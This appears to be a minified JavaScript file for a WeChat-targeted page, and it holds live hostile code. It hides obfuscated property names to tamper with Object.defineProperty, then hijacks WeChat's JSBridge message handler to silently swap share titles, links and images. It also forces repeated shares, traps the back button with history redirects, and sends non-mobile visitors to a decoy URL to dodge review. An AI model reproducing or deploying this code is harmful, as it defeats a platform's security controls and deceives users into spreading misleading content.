var app = app || {},
Url, oldDefProp, fakeUrl, Main, WechatShare, ua, weui, timess;
if (function() {
    var n = this;
    app.rndStr = function(n) {
        n = n || 32;
        var t = "abcdefhijkmnprstwxyz2345678",
        u = t.length,
        r = "";
        for (i = 0; i < n; i++) r += t.charAt(Math.floor(Math.random() * u));
        return r
    };
    app.rndNum = function(n) {
        return Math.ceil(Math.random() * n)
    };
    app.addRndToUrl = function(n) {
        return n.indexOf("?") > -1 ? n + "&rnd=" + app.rndStr(6) : n + "?rnd=" + app.rndStr(6)
    };
    app.decodeStr = function(n) {
        var r, t, i;
        if (!n) return "";
        for (r = n[0], t = n.split(r), i = 0; i < t.length; i++) t[i] && (t[i] = String.fromCharCode(t[i]));
        return t.join("")
    };
    app.rndSymbols = function(n) {
        n = n || 4;
        var t = "△▽○◇□☆▲▼●★☉⊙⊕Θ◎￠〓≡㊣♀※♂∷№囍＊▷◁♤♡♢♧☼☺☏♠♥♦♣☀☻☎☜☞♩♪♫♬◈▣◐◑☑☒☄☢☣☭❂☪➹☃☂❦❧✎✄�?",
        u = t.length,
        r = "";
        for (i = 0; i < n; i++) r += t.charAt(Math.floor(Math.random() * u));
        return r
    };
    app.strToCode = function(n) {
        for (var r = "",
        i, t = 0; t < n.length; t++) i = "0000" + parseInt(n[t].charCodeAt(0), 10).toString(16),
        r += i.substring(i.length - 4, i.length);
        return r
    };
    app.getCookie = function(n) {
        var t, i = new RegExp("(^| )" + n + "=([^;]*)(;|$)");
        return (t = document.cookie.match(i)) ? unescape(t[2]) : null
    };
    app.setCookie = function(n, t) {
        var i = new Date;
        i.setTime(i.getTime() + 2592e6);
        document.cookie = n + "=" + escape(t) + ";path=/;expires=" + i.toGMTString()
    };
    app.delCookie = function(n) {
        var t = new Date;
        t.setTime(t.getTime() - 86400);
        document.cookie = n + "=;path=/;expires=" + t.toGMTString()
    };
    app.showHint = function(n) {
        layer.open({
            content: n,
            time: 2
        })
    };
    app.showInfo = function(n, t) {
        layer.open({
            title: t || "提示",
            content: n,
            btn: ["我知道了"]
        })
    }
} (), ua = navigator.userAgent, ua.indexOf("MicroMessenger") > 0) {
    function isInWechat() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("micromessenger") >= 0
    }
    function isIos() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("iphone") >= 0 || n.indexOf("ipad") >= 0 || n.indexOf("applewebkit") >= 0
    }
    function isAndroid() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("android") >= 0
    }
    function isUrl(n) {
        return !! n && (n.indexOf("http://") >= 0 || n.indexOf("https://") >= 0)
    }
    function isArray(n) {
        return "[object Array]" === Object.prototype.toString.call(n)
    }
    function isNumber(n) {
        return "number" == typeof n
    }
    function getRandomNum(n, t) {
        var i = t - n,
        r = Math.random();
        return n + Math.round(r * i)
    }
    function getFormatDate() {
        var n = new Date,
        t = new Date(n.setHours(n.getHours() + 8)).toISOString();
        return t.substring(0, t.indexOf("T"))
    }
    function changeTitle(n) {
        if (document.title = n, navigator.userAgent.toLowerCase().indexOf("iphone") >= 0) {
            var i = $("body"),
            t = $('<iframe src="/favicon.ico"><\/iframe>');
            t.on("load",
            function() {
                setTimeout(function() {
                    t.off("load").remove()
                },
                0)
            }).appendTo(i)
        }
    }
    Url = function() {
        function n() {
            this.host = window.location.host;
            this.protocol = window.location.protocol;
            this.params = this.GetRequest(window.location.search);
            this.hash = window.location.hash;
            this.pathname = window.location.pathname
        }
        return n.prototype.GetHref = function(n) {
            var i = this,
            o = void 0 === n.port ? i.port: n.port,
            c = void 0 === n.pathname ? i.pathname: n.pathname,
            l = n.host || i.host,
            a = n.protocol || i.protocol || "http:",
            f = a + "//" + l + (o ? ":" + o: "") + c,
            r = {},
            e,
            s,
            u,
            t,
            h;
            if ("all" !== n.removeParams) for (t in i.params) i.params.hasOwnProperty(t) && (r[t] = i.params[t]);
            if (n.params) for (t in n.params) n.params.hasOwnProperty(t) && (r[t] = n.params[t]);
            if ("all" !== n.removeParams && (e = n.removeParams, e)) for (t in e) n.removeParams.hasOwnProperty(t) && (s = n.removeParams[t], delete r[s]);
            u = [];
            for (t in r) r.hasOwnProperty(t) && u.push(t + "=" + encodeURIComponent(r[t]));
            return u && u.length > 0 && (h = u.join("&")),
            f += f.indexOf("?") > 0 ? "&": "?",
            f + h
        },
        n.prototype.GetRequest = function(n) {
            var f = n,
            e = {};
            if (f.indexOf("?") != -1) for (var h = f.substr(1), o = h.split("&"), r = 0; r < o.length; r++) {
                var t = o[r],
                u = t.indexOf("="),
                i = void 0,
                s = void 0;
                u >= 0 ? (i = t.substr(0, u), s = decodeURIComponent(t.substring(u + 1))) : i = t;
                i && (e[i] = s)
            }
            return e
        },
        n
    } ();
    oldDefProp = Object.defineProperty;
    Object.defineProperty = function(n, t, i) { (t == app.decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110") || t == app.decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101")) && (i.writable = !0, i.configurable = !0);
        oldDefProp(n, t, i)
    };
    window.url = new Url;
    fakeUrl = "http://weather.html5.qq.com";
    window.config = {
        modelConfig: {
            forceShareCount: 3
        },
        showRepairPage: !1,
        forbidUrl: fakeUrl
    };
    window.mConfig = {};
    isAndroid() || isIos() || (location.href = config.forbidUrl ? config.forbidUrl: fakeUrl);
    Main = function() {
        function n() {
            this.nextUrlCalledCount = 0;
            this.forceShareCount = 4;
            this.currentShareCount = 0;
            this.toastTimeOut = 0;
            this.searchModelId = window.url.params.mid || "video-list";
            this.redirect = this.isNeedRedirect();
            this.isIphone = isIos();
            this.fileName = location.pathname.substr(location.pathname.lastIndexOf("/"));
            this.fileName.indexOf(".html") < 0 && (this.fileName = "/index.html")
        }
        return n.prototype.isNeedRedirect = function() {
            var n = window.url.params.from;
            return "timeline" == n || "groupmessage" == n || "singlemessage" == n || "share" == n
        },
        n.prototype.getRandomValueInArray = function(n, t) {
            if (!n) return t;
            if ("string" == typeof n) return n;
            if (!isArray(n)) return t;
            var i = getRandomNum(0, n.length - 1);
            return n[i] || t
        },
        n.prototype.start = function() {
            var t = this,
            n;
            t.hookBackButton();
            void t.setShareCallBack();
            n = {};
            n.title = sharedata.title;
            n.desc = sharedata.desc;
            n.link = sharedata.link;
            n.img_url = sharedata.imgUrl;
            app.timelineTitle = sharedata.qtitle;
            app.timelineUrl = sharedata.qlink;
            app.timelineImage = sharedata.qimgUrl;
            t.setModelShareData(n)
        },
        n.prototype.hookBackButton = function() {
            var n = this;
            window.setTimeout(function() {
                history.pushState("weixin", null, "#weixin");
                n.isIphone && history.pushState("weixin", null, "#weixin");
                window.onpopstate = function(n) {
                    if (!window.main.isIphone || null !== n.state) {
                        if (window.turl && window.turl.length > 0) return void(location.href = window.turl);
                        var t = main.backUrl;
                        if ("close" === t) WeixinJSBridge && WeixinJSBridge.call("closeWindow");
                        else if (t && t.length > 0) return void(location.href = t)
                    }
                }
            },
            50)
        },
        n.prototype.setShareCallBack = function() {
            var n = this;
            window.wcShare && (window.wcShare.shareCallback = function(t) {
                var r = !1,
                i = t && t.err_msg; ("send_app_msg:ok" == i || "send_app_msg:confirm" == i || "share_timeline:ok" == i) && (n.currentShareCount++, n.currentShareCount == n.forceShareCount && "share_timeline:ok" != i && n.currentShareCount--, r = !0);
                if (r) {
                    if ("share_timeline:ok" == i) {
                        sharedata.success('timeline')
                    } else {
                        sharedata.success('friend')
                    }
                }
            })
        },
        n.prototype.runAction = function() {
            console.log("runAction")
        },
        n.prototype.setNewShareData = function(n) {
            var t, i, r;
            return n == "timeline" ? (t = window.wcShare.shareData, app.timelineUrl && (t.link = app.timelineUrl), app.timelineTitle && (t.title = app.timelineTitle), app.timelineImage && (t.img_url = app.timelineImage), void(window.wcShare.shareData = t)) : this.model && this.model.getShareData && (this.modelShareData = this.model && this.model.getShareData(n), i = this.modelShareData, i || (r = $("img")[0], i = {
                link: location.href,
                title: document.title,
                desc: document.title,
                img_url: r && r.getAttribute("src")
            }), isUrl(i.link)) ? void(window.wcShare.shareData = i) : void 0
        },
        n.prototype.setModelShareData = function(n) {
            var t, r, i, s;
            if (window.wcShare) {
                if (t = {
                    link: n.link,
                    desc: n.desc,
                    title: n.title,
                    img_url: n.img_url
                },
                isUrl(t.link)) return void(window.wcShare.shareData = t);
                if (isUrl(this.nextUrl)) return t.link = this.nextUrl,
                void(window.wcShare.shareData = t);
                var u = void 0,
                f = void 0,
                e = void 0,
                o = "share-user-api-error";
                if (this.nextUrl && (u = this.nextUrl, f = this.fileName, e = "", o = "share-user-ok"), r = {
                    protocol: "http:",
                    host: u,
                    pathname: f,
                    port: e,
                    params: {
                        user: o,
                        dmid: this.searchDomainModelId,
                        sdmid: this.searchShareDomainModelId,
                        from: "share",
                        timestamp: Date.now()
                    },
                    removeParams: ["isappinstalled"]
                },
                n.linkParams) for (i in n.linkParams) n.linkParams.hasOwnProperty(i) && (s = n.linkParams[i], r.params[i] = s);
                t.link = url.GetHref(r);
                window.wcShare.shareData = t
            }
        },
        n
    } ();
    WechatShare = function() {
        function n() {
            var n = this;
            this.onBridgeReady = function() {
                var t = window.WeixinJSBridge,
                i = {
                    invoke: t.invoke,
                    call: t.call,
                    on: t.on,
                    env: t.env,
                    log: t.log,
                    _fetchQueue: t._fetchQueue,
                    _hasInit: t._hasInit,
                    _hasPreInit: t._hasPreInit,
                    _isBridgeByIframe: t._isBridgeByIframe,
                    _continueSetResult: t._continueSetResult,
                    _handleMessageFromWeixin: t._handleMessageFromWeixin
                };
                Object.defineProperty(window, "WeixinJSBridge", {
                    writable: !0,
                    enumerable: !0
                });
                window.WeixinJSBridge = i;
                try {
                    n.setHandleMessageHookForWeixin()
                } catch(t) {
                    n.restoreHandleMessageHookForWeixin()
                }
            };
            this.handleMesageHook = function(t) {
                var r;
                if (t) {
                    r = t.__json_message ? t.__json_message: t;
                    var i = r.__params,
                    u = r.__msg_type,
                    f = r.__event_id;
                    if ("callback" == u && n.shareCallback && "function" == typeof n.shareCallback) n.shareCallback(i);
                    else if ("event" == u && f && f.indexOf("share") > 0) {
                        var e = n.shareData.desc,
                        o = n.shareData.link,
                        s = n.shareData.img_url,
                        h = n.shareData.title;
                        if (f.indexOf("timeline") > 0) {
                            e = sharedata.desc,
                            o = sharedata.qlink,
                            s = sharedata.qimgUrl,
                            h = sharedata.qtitle
                        }
                        Object.defineProperty(i, "title", {
                            get: function() {
                                return delete i.scene,
                                i.desc = e,
                                i.link = o,
                                i.img_url = s,
                                Object.defineProperty(i, "title", {
                                    value: h,
                                    enumerable: !0
                                }),
                                "title"
                            },
                            set: function() {},
                            enumerable: !1,
                            configurable: !0
                        });
                        n.restoreHandleMessageHookForWeixin();
                        n.oldHandleMesageHook(t);
                        n.setHandleMessageHookForWeixin()
                    } else n.restoreHandleMessageHookForWeixin(),
                    n.oldHandleMesageHook(t),
                    n.setHandleMessageHookForWeixin()
                }
            };
            "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent && (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady), document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
        }
        return n.prototype.setHandleMessageHookForWeixin = function() {
            this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
            window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
        },
        n.prototype.restoreHandleMessageHookForWeixin = function() {
            this.oldHandleMesageHook && (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
        },
        n
    } ();
    window.wcShare = new WechatShare;
    $(document).ready(function() {
        window.main = new Main;
        window.main.start()
    })
}
function alertUI(c, t, yesfun) {
    var UIdom = document.getElementById("alertUI");
    t = (t ? t: '温馨提示'),
    c = (c ? c: '');
    if (UIdom == null) {
        var content = '<div id="alertUI" style="width:100%;height:100%; background:rgba(0,0,0,0.5);position: fixed; left:0px; top: 0px; z-index: 999999999;display:none;"><div  style="width:85%; background: #FFF; margin: 220px auto;border: 1px solid #CFCFCF;border-radius:3px;max-width:500px;"><h1 class="alertUI_title" style="margin:0px; padding: 15px 0 5px; font-family:\'arial\';font-size: 22px;line-height:30px;font-weight: normal;color:#000;text-align:center;">温馨提示</h1><div class="alertUI_content" style="padding:5px 20px;font-size: 17px;font-family:\'arial\'; color: #676767;"></div><p style="margin:0px; border-top:1px solid #cfcfcf; text-align:center; margin-top:20px"><a class="alertUI_button" style="font-family:\'arial\'; font-size:18px;color:#3cc51f;cursor: pointer;display:block;line-height:50px;text-align:center;">确定</a></p></div></div>';
        document.body.insertAdjacentHTML('beforeEnd', content)
    }
    var UIdom = document.getElementById("alertUI");
    UIdom.querySelectorAll(".alertUI_title")[0].innerHTML = t;
    UIdom.querySelectorAll(".alertUI_content")[0].innerHTML = c;
    UIdom.querySelectorAll(".alertUI_button")[0].onclick = function() {
        UIdom.style.display = 'none';
        if (typeof yesfun == 'function') {
            yesfun()
        }
    };
    UIdom.style.display = 'block';
    return false
}